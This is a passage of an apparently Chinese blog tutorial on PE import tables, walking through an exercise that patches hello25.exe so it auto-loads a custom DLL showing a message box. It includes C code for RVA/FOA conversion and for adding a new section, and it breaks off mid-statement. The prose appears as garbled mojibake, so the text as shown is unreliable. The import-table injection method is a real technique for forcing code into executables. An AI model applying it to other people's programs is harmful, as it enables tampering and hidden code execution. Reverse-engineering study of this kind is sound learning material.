src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20225124.png"></p><p>ç»“åˆå‰é¢ç»™å‡ºçš„ç»“æ„ä½“ï¼Œäº”ä¸ªDWIRDåˆ’åˆ†ä¸€ç»„å°±å¯ä»¥äº†ï¼Œç›¸ä¿¡ä½ åº”è¯¥èƒ½çœ‹æ‡‚å§ &#x3D;)</p><p>æˆ‘æŠŠæœ€åçš„å…¨é›¶ç»“æ„ä¹Ÿåˆ’å‡ºæ¥ï¼Œæ˜¯æƒ³å‘Šè¯‰ä½ æ“ä½œç³»ç»Ÿå°±æ˜¯æ ¹æ®åŒç­‰å¤§å°çš„å…¨é›¶ç»“æ„æ¥åˆ¤æ–­ä¸€ä¸ªè¡¨æ˜¯ä¸æ˜¯ç»“æŸï¼Œè¿™ä¸ªåœ¨å¾ˆå¤šåœ°æ–¹éƒ½ä¼šè§åˆ°</p><p>æˆ‘ä»¬æ„Ÿå…´è¶£çš„æ˜¯ç¬¬äºŒä¸ªå¯¼å…¥è¡¨ï¼Œä¹Ÿå°±æ˜¯ç»¿çº¿é‡Œé¢çš„ï¼Œï¼ˆå› ä¸º<code>MessageBoxA</code>è·Ÿè¿™ä¸ªç›¸å…³</p><p>é‚£å°±å¯¹ç€ç»“æ„ä½“æ¥è§£æå§ï¼</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">DWORD</span>   OriginalFirstThunk INTè¡¨ï¼š<span class="hljs-number">0</span>x2058 RVA -&gt; <span class="hljs-number">0</span>x658 FOA<br><span class="hljs-attribute">DWORD</span>   TimeDateStamp;     æ—¶é—´æˆ³:<span class="hljs-number">0</span>x00             <br><span class="hljs-attribute">DWORD</span>   ForwarderChain;    ä¸é‡è¦çš„ç©æ„å„¿:<span class="hljs-number">0</span>x00            <br><span class="hljs-attribute">DWORD</span>   Name;              æŒ‡å‘DLLçš„åç§°:<span class="hljs-number">0</span>x209A RVA<br><span class="hljs-attribute">DWORD</span>   FirstThunk;     IATè¡¨ï¼š<span class="hljs-number">0</span>x2008 RVA -&gt; <span class="hljs-number">0</span>x608 FOA<br></code></pre></td></tr></table></figure><p>çœ‹çœ‹INTè¡¨å’ŒIATè¡¨</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/INT.png"></p><p>ç”±RVA<code>0x208C</code>è½¬FOA<code>0x68c</code>æŸ¥çœ‹</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20231032.png"></p><p>ä¹Ÿå°±æ˜¯åˆ’ç»¿çº¿éƒ¨åˆ†å•¦ï¼ˆæ€è€ƒä¸ºä»€ä¹ˆåˆ°0åœæ­¢ï¼‰</p><p>è¿™ä¸ªåˆ’ç»¿çº¿éƒ¨åˆ†å°±æ˜¯<code>_IMAGE_IMPORT_BY_NAME </code>çš„ç»“æ„ï¼Œç¬¬ä¸€ä¸ª<code>Word</code>æ˜¯ç”±ç¼–è¯‘å™¨å†³å®šï¼Œç¬¬äºŒä¸ªåˆ™æ˜¯å‡½æ•°åå­—</p><p>ç»ˆäºæˆ‘ä»¬æ‰¾åˆ°äº†å‡½æ•°åå­—çš„ç”¨æ­¦ä¹‹åœ°</p><p>ç°åœ¨æˆ‘ä»¬åªéœ€è¦æŠŠè¿™ä¸ªç»¿è‰²ç»“æ„ä½“æ¢ä¸ªåœ°æ–¹ï¼Œç„¶åæŠŠåŸæ¥INTè¡¨ã€IATè¡¨ä¿®æ”¹ä¸€ä¸‹å°±å¥½å•¦</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20231502.png"></p><p>æ€è€ƒï¼šä¸ä¿®æ”¹IATè¡¨ï¼Œç…§æ ·èƒ½å¤Ÿæ­£å¸¸è¿è¡Œï¼Œä¸ºä»€ä¹ˆï¼Ÿ</p><h3 id="5-ç¼–å†™ä¸€ä¸ªå¼¹å‡ºæ¶ˆæ¯æ¡†çš„msg-dllæ–‡ä»¶ï¼Œä»…ä¿®æ”¹hello25-exeçš„å¼•å…¥å‡½æ•°èŠ‚éƒ¨åˆ†æ•°æ®ï¼Œä½¿å¾—hello25-exeè¿è¡Œæ—¶è‡ªåŠ¨åŠ è½½msg-dllï¼Œå¹¶å¼¹å‡ºæ¶ˆæ¯æ¡†ã€‚"><a href="#5-ç¼–å†™ä¸€ä¸ªå¼¹å‡ºæ¶ˆæ¯æ¡†çš„msg-dllæ–‡ä»¶ï¼Œä»…ä¿®æ”¹hello25-exeçš„å¼•å…¥å‡½æ•°èŠ‚éƒ¨åˆ†æ•°æ®ï¼Œä½¿å¾—hello25-exeè¿è¡Œæ—¶è‡ªåŠ¨åŠ è½½msg-dllï¼Œå¹¶å¼¹å‡ºæ¶ˆæ¯æ¡†ã€‚" class="headerlink" title="5.ç¼–å†™ä¸€ä¸ªå¼¹å‡ºæ¶ˆæ¯æ¡†çš„msg.dllæ–‡ä»¶ï¼Œä»…ä¿®æ”¹hello25.exeçš„å¼•å…¥å‡½æ•°èŠ‚éƒ¨åˆ†æ•°æ®ï¼Œä½¿å¾—hello25.exeè¿è¡Œæ—¶è‡ªåŠ¨åŠ è½½msg.dllï¼Œå¹¶å¼¹å‡ºæ¶ˆæ¯æ¡†ã€‚"></a>5.ç¼–å†™ä¸€ä¸ªå¼¹å‡ºæ¶ˆæ¯æ¡†çš„msg.dllæ–‡ä»¶ï¼Œä»…ä¿®æ”¹hello25.exeçš„å¼•å…¥å‡½æ•°èŠ‚éƒ¨åˆ†æ•°æ®ï¼Œä½¿å¾—hello25.exeè¿è¡Œæ—¶è‡ªåŠ¨åŠ è½½msg.dllï¼Œå¹¶å¼¹å‡ºæ¶ˆæ¯æ¡†ã€‚</h3><p>ï¼ˆçœ‹æ­¤é¢˜ä¹‹å‰ï¼Œå»ºè®®å…ˆçœ‹ç¬¬å…­é¢˜ï¼Œä½ ä¼šå¯¹å¯¼å…¥è¡¨æœ‰ä¸€ä¸ªæ›´æ¸…æ™°çš„è®¤è¯†ï¼‰</p><p>é¦–å…ˆï¼Œä½ éœ€è¦ä¼šç¼–å†™ä¸€ä¸ªdllæ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ï¼Œä½†è¿™ä¸ªå¹¶ä¸æ˜¯é‡ç‚¹ï¼Œå¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/L_Mu2000/article/details/115418810">è¿™ç¯‡æ–‡ç« </a></p><p>è¿™æ˜¯æˆ‘çš„DLLä»£ç </p><p>è¿™é¢˜çš„åŸç†æ˜¯è¿™æ ·çš„ï¼šæ“ä½œç³»ç»Ÿä¼šæ ¹æ®å¯¼å…¥è¡¨æ¥åŠ è½½DLLï¼Œè€Œåœ¨DLLåŠ è½½çš„æ—¶å€™å°±å¯ä»¥æ‰§è¡Œå›è°ƒå‡½æ•°ï¼ˆä¸C++é‡Œé¢çš„é­”æ³•æ–¹æ³•ç±»ä¼¼ï¼Œå°±æ˜¯è‡ªåŠ¨æ‰§è¡Œé‚£ç§ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦æƒ³åŠæ³•è®©æ“ä½œç³»ç»ŸåŠ è½½æˆ‘ä»¬çš„DLLã€‚</p><p>è¿˜è®°ä¸è®°å¾—ä¹‹å‰æåŠå¯¼å…¥è¡¨ä»¥ä¸€ä¸ªå…¨é›¶çš„ç»“æ„ä½œä¸ºç»“æŸï¼Œå¦‚æœæˆ‘ä»¬ç»™è¿™ä¸ªç»“æ„æ”¹ä¸€æ”¹ï¼Œæˆ‘ä»¬äººä¸ºçš„åœ¨å¯¼å…¥è¡¨åŠ ä¸€ä»½æˆ‘ä»¬è‡ªå·±DLL</p><p>æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬éœ€è¦äººä¸ºåœ¨å¯¼å…¥è¡¨é‡Œæ·»åŠ ä¸€é¡¹DLLï¼Œæ¥éª—è¿‡æ“ä½œç³»ç»Ÿã€‚ä½†æ˜¯ä¼šé¢ä¸´ä¸€ä¸ªé—®é¢˜ï¼Œå³åŸæ¥çš„å¯¼å…¥è¡¨ä¸å¤Ÿä½ç½®ï¼Œå› ä¸ºæ“ä½œç³»ç»Ÿæ˜¯æ ¹æ®å¯¼å…¥è¡¨æœ€åçš„å…¨0ç»“æ„æ¥åˆ¤æ–­æ˜¯å¦å¯¼å…¥è¡¨æ˜¯å¦ç»“æŸï¼Œå¦‚æœè¯´åŸæ¥çš„å¯¼å…¥è¡¨åé¢åªæœ‰20ä¸ªé›¶ï¼ˆä¸€ä¸ªå¯¼å…¥è¡¨ç»“æ„çš„å¤§å°ï¼‰ï¼Œé‚£ä¹ˆæ˜¾ç„¶æ˜¯ä¸èƒ½åœ¨æ­¤åŸºç¡€ä¸Šæ·»åŠ å¯¼å…¥è¡¨çš„ï¼Œå› ä¸ºè¿™æ ·å°±ä¼šåŠ è½½è¿›é”™è¯¯çš„å¯¼å…¥è¡¨ï¼Œä»è€Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚</p><p>æˆ‘è¿™é‡Œé‡‡å–ç§»åŠ¨å¯¼å…¥è¡¨çš„å½¢å¼ï¼ˆè¿˜æœ‰ä¸€ç§æ–¹å¼æŠŠåŸæ¥çš„ExitProcessç­‰å­—ç¬¦ä¸²å…¨éƒ¨åç§»ï¼Œè¿™æ ·å°±æœ‰ç©ºé—´å¢åŠ æˆ‘ä»¬çš„è‡ªå·±çš„å¯¼å…¥è¡¨äº†ï¼Œä½†æ˜¯ä¹Ÿå¾—ä¿®å¤ï¼Œè¿™ä¸ªæ–¹æ³•æˆ‘æ”¾åœ¨ç¬¬å…­é¢˜è®²ï¼‰</p><p>ç§»åŠ¨æœ€å¥½çš„æ–¹å¼æ˜¯æ–°å¼€ä¸€ä¸ªèŠ‚ï¼ˆå¦‚ä½•æ–°å¢ä¸€ä¸ªèŠ‚ä¹Ÿæ˜¯ä¸€ä¸ªå€¼å¾—è®¨è®ºçš„è¯é¢˜ï¼Œå‚è€ƒä¸‹<a href="http://yring-me.com/2023/07/04/PE_4/">è¿™ç¯‡æ–‡ç« </a>ï¼‰ï¼Œç„¶åæ ¹æ®ç›®å½•é¡¹å¼€å§‹é€è¡¨é€è¡¨copyï¼Œä½ å¯èƒ½æœ‰ä¸€ä¸ªç–‘é—®â€”â€”ä¸ºä»€ä¹ˆè¦é€è¡¨ï¼Œè€Œä¸ç›´æ¥ä½¿ç”¨ç›®å½•é¡¹çš„sizeæˆå‘˜å‘¢ï¼ŸåŸå› æœ‰äºŒï¼Œç¬¬ä¸€è¿™ä¸ªsizeæ˜¯ä¸å‡†ç¡®çš„ï¼Œåœ¨è®¸å¤šç¼–è¯‘å™¨ä¸­éƒ½ä¼šå°†æ­¤å€¼ç½®0ï¼Œä½ ä¹Ÿå¯ä»¥è‡ªå·±æŠŠå®ƒè®¾ç½®æˆ0ï¼Œç¨‹åºä¸€æ ·å¯ä»¥æ­£å¸¸è¿è¡Œï¼›ç¬¬äºŒè¿™ä¸ªsizeå¯èƒ½ä¸åªåŒ…å«å¯¼å…¥è¡¨ï¼Œè¿˜å¯èƒ½åŒ…å«äº†INTè¡¨ï¼ŒIATè¡¨ç­‰æ‰€æœ‰çš„å¤§å°ï¼Œä½†æ˜¯æˆ‘ä»¬åªæƒ³copyå•çº¯çš„å¯¼å…¥è¡¨ã€‚</p><p>å› æ­¤éœ€è¦é€è¡¨é€è¡¨copyï¼Œç„¶åç”¨20å­—èŠ‚æ¥åšæ–°è¡¨çš„å¤§å°ï¼Œå†ç”¨20å­—èŠ‚åšç»“æŸçš„æ ‡å¿—</p><p>æ–°å¢INTè¡¨ã€IATè¡¨</p><p>ä»…ä»…åˆ›å»ºæ–°è¡¨æ˜¯ä¸å¤Ÿçš„ï¼Œå› æ­¤æ­¤æ—¶è¡¨ç»“æ„å…¨ä¸º0ï¼Œå³ä½¿è®¾ç½®äº†DLLçš„åå­—ã€‚å› ä¸ºæ“ä½œç³»ç»Ÿä¼šçœ‹è¿™ä¸ªè¡¨çš„INTè¡¨ã€IATè¡¨ï¼Œå¦‚æœè¿™ä¸¤å¼ è¡¨ä¸º0ï¼Œå°±è¯´æ˜æ²¡æœ‰ç”¨åˆ°è¿™ä¸ªDLLï¼Œå°±ä¸ä¼šæŠŠä»–åŠ è½½ç¨‹åº4GBç©ºé—´ã€‚å› æ­¤éœ€è¦æ–°å¢INTè¡¨ã€IATè¡¨ï¼Œæˆ‘ä»¬åªéœ€è¦æ–°å¢ä¸€é¡¹å°±å¯ä»¥ä½¿å¾—æ“ä½œç³»ç»ŸåŠ è½½DLLäº†ã€‚</p><p>åŒç†INTè¡¨ã€IATè¡¨ä¹Ÿéœ€è¦å…¨é›¶0ç»“æ„ä½œä¸ºç»“æŸï¼Œè€Œè¿™ä¸¤å¼ è¡¨è¡¨é¡¹å¤§å°æ˜¯4å­—èŠ‚ï¼Œå› æ­¤æ¯ä¸€å¼ è¡¨éƒ½éœ€è¦8å­—èŠ‚æ¥å®Œæˆæ–°å¢æ“ä½œã€‚æ­¤åå°±æ˜¯è®¾ç½®è¿™ä¸¤å¼ è¡¨çš„è¡¨é¡¹ï¼Œä½¿å…¶æŒ‡å‘PIMAGE_IMPORT_BY_NAMEç»“æ„ï¼ˆå½“ç„¶ä½¿ç”¨åºå·çš„æ–¹å¼ä¹Ÿæ˜¯å¯ä»¥çš„ï¼‰</p><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯é‡æ–°æ„è¿™å‡ å¼ è¡¨çš„æŒ‡å‘å…³ç³»ï¼Œä¹Ÿå°±æ˜¯å¦‚å›¾çš„æ‰€æœ‰ç®­å¤´</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307260019297.png"></p><p>åªè¦é‡æ–°å»ºç«‹è¿™äº›ç®­å¤´æŒ‡å‘ï¼Œä¹Ÿå°±ä»£è¡¨ä¸€ä¸ªæ–°çš„å¯¼å…¥è¡¨æˆåŠŸå»ºç«‹</p><p>è¿™é‡Œæˆ‘ä¹Ÿç›´æ¥ç»™å‡ºæˆ‘çš„ä»£ç å§</p><p>ä»£ç æœ‰æ³¨é‡Šï¼Œç›¸ä¿¡ä½ èƒ½ç¢ç£¨æ˜ç™½çš„ï¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ADD_SIZE 0x3000</span><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br>DWORD <span class="hljs-title function_">RVA_TO_FOA</span><span class="hljs-params">(DWORD RVA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br>    <br>    <span class="hljs-keyword">if</span> (RVA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> RVA;<br>&#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(RVA &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; RVA &lt; (SectionHeader+<span class="hljs-number">1</span>)-&gt;VirtualAddress)&#123;<br>            DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader +=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>     <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚åŒº</span><br>    DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>&#125;<br><br>DWORD <span class="hljs-title function_">FOA_TO_RVA</span><span class="hljs-params">(DWORD FOA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader= <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-keyword">if</span> (FOA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> FOA;<br>&#125;<br><br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(FOA &gt;= SectionHeader-&gt;PointerToRawData&amp;&amp; FOA &lt; (SectionHeader +<span class="hljs-number">1</span>)-&gt;PointerToRawData)&#123;<br>            <br>            DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚åŒº</span><br>    DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>&#125;<br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">Section_add</span><span class="hljs-params">(FILE* fp,<span class="hljs-type">char</span>* buffer)</span>&#123;<br>    DWORD size =  Size(fp);<br>    DWORD new_size = size + ADD_SIZE ;<br><br>    <span class="hljs-type">char</span>* NewBuffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(new_size);<br>    <span class="hljs-keyword">if</span> (!NewBuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed to creat buffer!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">memset</span>(NewBuffer,<span class="hljs-number">0</span>,new_size);<br>    <span class="hljs-built_in">memcpy</span>(NewBuffer,buffer,size);<br><br>    <span class="hljs-comment">//åˆå§‹åŒ–PEå¤´éƒ¨ä¿¡æ¯</span><br>DosHeader = (PIMAGE_DOS_HEADER)NewBuffer;<br>NTHeader = (PIMAGE_NT_HEADERS)(NewBuffer + DosHeader-&gt;e_lfanew);<br>FILEHeader = (PIMAGE_FILE_HEADER)(NewBuffer+DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚è¡¨åœ°å€</span><br>PIMAGE_SECTION_HEADER LastSection = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader+IMAGE_SIZEOF_SECTION_HEADER*(FILEHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>));<br><span class="hljs-comment">//æ–°èŠ‚è¡¨åœ°å€</span><br>PIMAGE_SECTION_HEADER NewSection = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader + IMAGE_SIZEOF_SECTION_HEADER * (FILEHeader-&gt;NumberOfSections));<br><br>    <span class="hljs-comment">//åˆ¤æ–­å‰©ä½™ç©ºé—´</span><br>    DWORD Remained_size = (DWORD)(OptionalHeader-&gt;SizeOfHeaders - DosHeader-&gt;e_lfanew - <span class="hljs-number">4</span><br>- IMAGE_SIZEOF_FILE_HEADER - IMAGE_SIZEOF_SECTION_HEADER * FILEHeader-&gt;NumberOfSections);<br><span class="hljs-keyword">if</span> (Remained_size &lt; <span class="hljs-number">2</span> * IMAGE_SIZEOF_SECTION_HEADER)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do not have enough space!\n&quot;</span>);<br><span class="hljs-built_in">free</span>(NewBuffer);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-comment">//===================ä¿®æ”¹ä¿¡æ¯====================</span><br><span class="hljs-comment">//å…¶ä»–å¤´éƒ¨éœ€è¦ä¿®æ”¹çš„ä¿¡æ¯</span><br>FILEHeader-&gt;NumberOfSections += <span class="hljs-number">1</span>;<br>    OptionalHeader-&gt;SizeOfImage += ADD_SIZE;<br>    <br>    <span class="hljs-comment">//å¡«å…¥æ•°æ®</span><br>    <span class="hljs-built_in">memcpy</span>(NewSection-&gt;Name,<span class="hljs-string">&quot;.NewSec&quot;</span>,<span class="hljs-number">8</span>);<br>    NewSection-&gt;Misc.VirtualSize = ADD_SIZE;<br>    NewSection-&gt;SizeOfRawData = ADD_SIZE;<br>    NewSection-&gt;PointerToRawData = LastSection-&gt;PointerToRawData + LastSection-&gt;SizeOfRawData;<br><br>DWORD add_size = 